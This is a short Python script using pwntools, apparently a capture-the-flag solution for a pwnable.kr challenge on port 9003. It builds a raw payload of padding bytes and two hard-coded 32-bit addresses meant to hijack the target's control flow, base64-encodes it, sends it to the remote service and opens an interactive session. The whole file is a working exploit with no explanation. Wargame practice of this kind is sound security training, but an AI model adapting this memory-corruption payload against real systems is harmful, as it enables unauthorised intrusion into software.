import base64
from pwn import *


raw = b'\x00' * 4 + p32(0x08049278) + p32(0x0811EB40)


payload = base64.b64encode(raw)
print("payload:", payload)
pro = remote("pwnable.kr", 9003)
print(pro.recvuntil(" : "))
pro.sendline(payload)
pro.interactive()


